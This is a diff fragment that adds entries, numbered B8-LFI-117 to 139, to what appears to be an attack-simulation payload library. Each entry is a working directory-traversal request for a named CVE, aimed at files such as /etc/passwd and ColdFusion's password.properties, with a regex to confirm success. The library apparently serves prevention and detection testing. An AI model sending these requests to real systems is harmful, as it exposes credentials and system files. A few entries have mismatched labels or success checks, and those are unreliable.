+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_perchafieldsattach&controller=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component Percha Downloads Attach 1.1 - Directory Traversal (Nuclei: CVE-2010-2037)",
+    "payload_external_id": "B8-LFI-117",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-2037 by daffainfo] A directory traversal vulnerability in the Percha Downloads Attach (com_perchadownloadsattach) component 1.1 for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impacts via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_perchadownloadsattach&controller=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component FDione Form Wizard 1.0.2 - Local File Inclusion (Nuclei: CVE-2010-2045)",
+    "payload_external_id": "B8-LFI-118",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-2045 by daffainfo] A directory traversal vulnerability in the Dione Form Wizard (aka FDione or com_dioneformwizard) component 1.0.2 for Joomla! allows remote attackers to read arbitrary files via directory traversal sequences in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_dioneformwizard&controller=../../../../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component MS Comment 0.8.0b - Local File Inclusion (Nuclei: CVE-2010-2050)",
+    "payload_external_id": "B8-LFI-119",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-2050 by daffainfo] A directory traversal vulnerability in the Moron Solutions MS Comment (com_mscomment) component 0.8.0b for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_mscomment&controller=../../../../../../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component simpledownload <=0.9.5 - Arbitrary File Retrieval (Nuclei: CVE-2010-2122)",
+    "payload_external_id": "B8-LFI-120",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-2122 by daffainfo] A directory traversal vulnerability in the SimpleDownload (com_simpledownload) component before 0.9.6 for Joomla! allows remote attackers to retrieve arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_simpledownload&task=download&fileid=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component JE Quotation Form 1.0b1 - Local File Inclusion (Nuclei: CVE-2010-2128)",
+    "payload_external_id": "B8-LFI-121",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-2128 by daffainfo] A directory traversal vulnerability in the JE Quotation Form (com_jequoteform) component 1.0b1 for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impacts via a .. (dot dot) in the view parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_jequoteform&view=../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component com_bfsurvey - Local File Inclusion (Nuclei: CVE-2010-2259)",
+    "payload_external_id": "B8-LFI-122",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-2259 by daffainfo] A directory traversal vulnerability in the BF Survey (com_bfsurvey) component for Joomla! allows remote attackers to include and execute arbitrary local files via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_bfsurvey&controller=../../../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Motorola SBV6120E SURFboard Digital Voice Modem SBV6X2X-1.0.0.5-SCM - Directory Traversal (Nuclei: CVE-2010-2307)",
+    "payload_external_id": "B8-LFI-123",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-2307 by daffainfo] Multiple directory traversal vulnerabilities in the web server for Motorola SURFBoard cable modem SBV6120E running firmware SBV6X2X-1.0.0.5-SCM-02-SHPC allow remote attackers to read arbitrary files via (1) \"//\" (multiple leading slash), (2) ../ (dot dot) sequences, and encoded dot dot sequences ...",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/../../etc/passwd",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component Picasa2Gallery 1.2.8 - Local File Inclusion (Nuclei: CVE-2010-2507)",
+    "payload_external_id": "B8-LFI-124",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-2507 by daffainfo] A directory traversal vulnerability in the Picasa2Gallery (com_picasa2gallery) component 1.2.8 and earlier for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impacts via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_picasa2gallery&controller=../../../../../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component jesectionfinder - Local File Inclusion (Nuclei: CVE-2010-2680)",
+    "payload_external_id": "B8-LFI-125",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-2680 by daffainfo] A directory traversal vulnerability in the JExtensions JE Section/Property Finder (jesectionfinder) component for Joomla! allows remote attackers to include and execute arbitrary local files via directory traversal sequences in the view parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/propertyfinder/component/jesectionfinder/?view=../../../../../../../../../../../../../etc/passwd",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component Realtyna Translator 1.0.15 - Local File Inclusion (Nuclei: CVE-2010-2682)",
+    "payload_external_id": "B8-LFI-126",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-2682 by daffainfo] A directory traversal vulnerability in the Realtyna Translator (com_realtyna) component 1.0.15 for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impacts via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_realtyna&controller=../../../../../../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component Music Manager - Local File Inclusion (Nuclei: CVE-2010-2857)",
+    "payload_external_id": "B8-LFI-127",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-2857 by daffainfo] A directory traversal vulnerability in the Music Manager component for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impacts via a .. (dot dot) in the cid parameter to album.html.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/component/music/album.html?cid=../../../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Adobe ColdFusion 8.0/8.0.1/9.0/9.0.1 LFI (Nuclei: CVE-2010-2861)",
+    "payload_external_id": "B8-LFI-128",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-2861 by pikpikcu] Multiple directory traversal vulnerabilities in the administrator console in Adobe ColdFusion 9.0.1 and earlier allow remote attackers to read arbitrary files via the locale parameter to (1) CFIDE/administrator/settings/mappings.cfm, (2) logging/settings.cfm, (3) datasources/index.cfm, (4) j2eepa...",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "rdspassword=|encrypted="
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component Visites 1.1 - MosConfig_absolute_path Remote File Inclusion (Nuclei: CVE-2010-2918)",
+    "payload_external_id": "B8-LFI-129",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-2918 by daffainfo] A PHP remote file inclusion vulnerability in core/include/myMailer.class.php in the Visites (com_joomla-visites) component 1.1 RC2 for Joomla! allows remote attackers to execute arbitrary PHP code via a URL in the mosConfig_absolute_path parameter.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/administrator/components/com_joomla-visites/core/include/myMailer.class.php?mosConfig_absolute_path=../../../../../../../../../../../../etc/passwd",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component Foobla Suggestions 1.5.1.2 - Local File Inclusion (Nuclei: CVE-2010-2920)",
+    "payload_external_id": "B8-LFI-130",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-2920 by daffainfo] A directory traversal vulnerability in the Foobla Suggestions (com_foobla_suggestions) component 1.5.1.2 for Joomla! allows remote attackers to read arbitrary files via directory traversal sequences in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_foobla_suggestions&controller=../../../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component PicSell 1.0 - Arbitrary File Retrieval (Nuclei: CVE-2010-3203)",
+    "payload_external_id": "B8-LFI-131",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-3203 by daffainfo] A directory traversal vulnerability in the PicSell (com_picsell) component 1.0 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the dflink parameter in a prevsell dwnfree action to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_picsell&controller=prevsell&task=dwnfree&dflink=../../../configuration.php",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component Jphone 1.0 Alpha 3 - Local File Inclusion (Nuclei: CVE-2010-3426)",
+    "payload_external_id": "B8-LFI-132",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-3426 by daffainfo] A directory traversal vulnerability in jphone.php in the JPhone (com_jphone) component 1.0 Alpha 3 for Joomla! allows remote attackers to include and execute arbitrary local files via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_jphone&controller=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Camtron CMNC-200 IP Camera - Directory Traversal (Nuclei: CVE-2010-4231)",
+    "payload_external_id": "B8-LFI-133",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-4231 by daffainfo] The CMNC-200 IP Camera has a built-in web server that is vulnerable to directory transversal attacks, allowing access to any file on the camera file system.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/../../../../../../../../../../../../../etc/passwd",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Tiki Wiki CMS Groupware 5.2 - Local File Inclusion (Nuclei: CVE-2010-4239)",
+    "payload_external_id": "B8-LFI-134",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-4239 by 0x_akoko] Tiki Wiki CMS Groupware 5.2 is susceptible to a local file inclusion vulnerability.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/tiki-jsplugin.php?plugin=x&language=../../../../../../../../../../windows/win.ini",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [],
+    "expected_body_regex": "bit\\ app\\ support|fonts|extensions"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "phpShowtime 2.0 - Directory Traversal (Nuclei: CVE-2010-4282)",
+    "payload_external_id": "B8-LFI-135",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-4282 by daffainfo] Multiple directory traversal vulnerabilities in Pandora FMS before 3.1.1 allow remote attackers to include and execute arbitrary local files via (1) the page parameter to ajax.php or (2) the id parameter to general/pandora_help.php, and allow remote attackers to include and execute, create, modif...",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/pandora_console/ajax.php?page=../../../../../../etc/passwd",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component JotLoader 2.2.1 - Local File Inclusion (Nuclei: CVE-2010-4617)",
+    "payload_external_id": "B8-LFI-136",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-4617 by daffainfo] A directory traversal vulnerability in the JotLoader (com_jotloader) component 2.2.1 for Joomla! allows remote attackers to read arbitrary files via directory traversal sequences in the section parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_jotloader&section=../../../../../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component JRadio - Local File Inclusion (Nuclei: CVE-2010-4719)",
+    "payload_external_id": "B8-LFI-137",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-4719 by daffainfo] A directory traversal vulnerability in JRadio (com_jradio) component before 1.5.1 for Joomla! allows remote attackers to read arbitrary files via directory traversal sequences in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_jradio&controller=../../../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component Jimtawl 1.0.2 - Local File Inclusion (Nuclei: CVE-2010-4769)",
+    "payload_external_id": "B8-LFI-138",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-4769 by daffainfo] A directory traversal vulnerability in the Jimtawl (com_jimtawl) component 1.0.2 Joomla! allows remote attackers to read arbitrary files and possibly unspecified other impacts via a .. (dot dot) in the task parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_jimtawl&Itemid=12&task=../../../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component Canteen 1.0 - Local File Inclusion (Nuclei: CVE-2010-4977)",
+    "payload_external_id": "B8-LFI-139",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-4977 by daffainfo] A SQL injection vulnerability in menu.php in the Canteen (com_canteen) component 1.0 for Joomla! allows remote attackers to execute arbitrary SQL commands via the mealid parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
